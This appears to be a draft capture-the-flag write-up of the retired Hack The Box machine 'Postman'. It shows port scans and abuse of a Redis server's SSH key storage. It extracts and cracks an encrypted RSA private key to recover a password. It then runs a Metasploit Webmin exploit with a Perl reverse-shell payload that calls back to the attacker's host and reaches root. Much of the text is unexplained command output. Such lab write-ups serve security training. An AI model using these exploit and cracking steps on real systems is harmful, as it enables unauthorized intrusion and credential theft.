Title:HTB: Postman
Date: xx-xx-2020 12:30
category:security
tags:security, boot2root, HTB, redis
meta:security, boot2root, HTB, redis

<img class="align-left" src="/media/2020.xx/postman_card.png" alt="Postman Card" width="262">

This box is a writeup about a retired HacktheBox machine:
[Postman](https://www.hackthebox.eu/home/machines/profile/215).
This box is rated as easy box. It implies 

<!-- PELICAN_END_SUMMARY -->

[TOC]

# Recon

Let us start as always by a `nmap` scan. The box is quit busy so first of all we
run a simple aggressive TCP scan:

    :::text
    # Nmap 7.80 scan initiated Tue Nov 19 16:52:02 2019 as: nmap -p- -sS -oA nmap_all_port -T4 10.10.10.160
    Nmap scan report for 10.10.10.160
    Host is up (0.090s latency).
    Not shown: 65530 closed ports
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    4444/tcp  open  krb524
    6379/tcp  open  redis
    10000/tcp open  snet-sensor-mgmt

We run a version scan on this open ports:

    :::text
    # Nmap 7.80 scan initiated Tue Nov 19 18:32:32 2019 as: nmap -p22,80,4444,6379,10000 -sSV -oA nmap_version 10.10.10.160
    Nmap scan report for 10.10.10.160
    Host is up (0.087s latency).

    PORT      STATE  SERVICE VERSION
    22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))
    4444/tcp  closed krb524
    6379/tcp  open   redis   Redis key-value store 4.0.9
    10000/tcp open   http    MiniServ 1.910 (Webmin httpd)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

The open ports are:
* 22: SSH
* 80: a web server
* 6379: a redis server
* 10 000: another web server

We do not have any information to connect to the SSH server.

The website on port 80 does not give us anything.

The website on port 10 000 is a webmin login interface. There is a few exploit
available for it:

    :::text
    searchsploit webmin
    ----------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
    Exploit Title                                                                                                                                             |  Path
                                                                                                                                                              | (/usr/share/exploitdb/)
    ----------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
    DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                                                            | exploits/cgi/webapps/23535.txt
    Webmin - Brute Force / Command Execution                                                                                                                   | exploits/multiple/remote/705.pl
    Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                                                | exploits/linux/remote/22275.pl
    Webmin 0.x - 'RPC' Privilege Escalation                                                                                                                    | exploits/linux/remote/21765.pl
    Webmin 0.x - Code Input Validation                                                                                                                         | exploits/linux/local/21348.txt
    Webmin 1.5 - Brute Force / Command Execution                                                                                                               | exploits/multiple/remote/746.pl
    Webmin 1.5 - Web Brute Force (CGI)                                                                                                                         | exploits/multiple/remote/745.pl
    Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                                                      | exploits/unix/remote/21851.rb
    Webmin 1.850 - Multiple Vulnerabilities                                                                                                                    | exploits/cgi/webapps/42989.txt
    Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                                       | exploits/cgi/remote/46201.rb
    Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                                     | exploits/linux/remote/46984.rb
    Webmin 1.920 - Remote Code Execution                                                                                                                       | exploits/linux/webapps/47293.sh
    Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                          | exploits/linux/remote/47230.rb
    Webmin 1.x - HTML Email Command Execution                                                                                                                  | exploits/cgi/webapps/24574.txt
    Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                                                                                         | exploits/multiple/remote/1997.php
    Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                                                                                        | exploits/multiple/remote/2017.pl
    phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                                                           | exploits/php/webapps/2462.txt
    phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                                                       | exploits/php/webapps/2451.txt
    webmin 0.91 - Directory Traversal                                                                                                                          | exploits/cgi/remote/21183.txt
    ----------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result



    :::text
    root@kalili:~# redis-cli -h 10.10.10.160
    10.10.10.160:6379> CONFIG GET dbfilename
    1) "dbfilename"
    2) "authorized_keys"
    10.10.10.160:6379> CONFIG GET dir
    1) "dir"
    2) "/var/lib/redis/.ssh"


    :::text
    redis@Postman:~$ cat .bash_history 
    exit
    su Matt
    pwd
    nano scan.py
    python scan.py
    nano scan.py
    clear
    nano scan.py
    clear
    python scan.py
    exit
    exit
    cat /etc/ssh/sshd_config 
    su Matt
    clear
    cd /var/lib/redis
    su Matt
    exit
    cat id_rsa.bak 
    ls -la
    exit
    cat id_rsa.bak 
    exit
    ls -la
    crontab -l
    systemctl enable redis-server
    redis-server
    ifconfig
    netstat -a
    netstat -a
    netstat -a
    netstat -a
    netstat -a > txt
    exit
    crontab -l
    cd ~/
    ls
    nano 6379
    exit


    :::text
    redis@Postman:~$ find / -name 'id_rsa.bak' 2> /dev/null^C
    redis@Postman:~$ ls /opt/id_rsa.bak 
    /opt/id_rsa.bak
    redis@Postman:~$ cat /opt/id_rsa.bak
    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

    JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
    cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
    7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
    cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
    1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
    EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
    UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
    Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
    t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
    5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
    P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
    jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
    SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
    l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
    0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
    S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
    hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
    Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
    XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
    b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
    WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
    KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
    npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
    VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
    X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
    -----END RSA PRIVATE KEY-----


    :::text
    python2 /usr/bin/ssh2john redis_rsa > redis_rsa.hash
    john redis_rsa.hash -w=rockyou.txt
    computer2008

    :::text
    redis@Postman:~$ su Matt
    Password: 
    Matt@Postman:/var/lib/redis$ cat^C
    Matt@Postman:/var/lib/redis$ cd
    Matt@Postman:~$ ls
    user.txt
    Matt@Postman:~$ cat user.txt 
    517ad0<redacted>


    :::text
    msf5 exploit(linux/remote/46984) > show options 

    Module options (exploit/linux/remote/46984):

      Name       Current Setting  Required  Description
      ----       ---------------  --------  -----------
      PASSWORD   computer2008     yes       Webmin Password
      Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
      RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
      RPORT      10000            yes       The target port (TCP)
      SSL        true             no        Negotiate SSL/TLS for outgoing connections
      TARGETURI  /                yes       Base path for Webmin application
      USERNAME   Matt             yes       Webmin Username
      VHOST                       no        HTTP server virtual host


    Payload options (cmd/unix/reverse_perl):

      Name   Current Setting  Required  Description
      ----   ---------------  --------  -----------
      LHOST  10.10.14.13      yes       The listen address (an interface may be specified)
      LPORT  4444             yes       The listen port


    Exploit target:

      Id  Name
      --  ----
      0   Webmin <= 1.910


    :::text
    msf5 exploit(linux/remote/46984) > run
    [*] Started reverse TCP handler on 10.10.14.13:4444 
    [+] Session cookie: a2ff4450e3a344159ab1fd464db52855
    [*] Attempting to execute the payload...
    [*] Command shell session 1 opened (10.10.14.13:4444 -> 10.10.10.160:32916) at 2019-11-20 14:39:02 +0100

    id
    uid=0(root) gid=0(root) groups=0(root)
    cat root.txt
    cat /root/root.txt
    a2577<redacted>

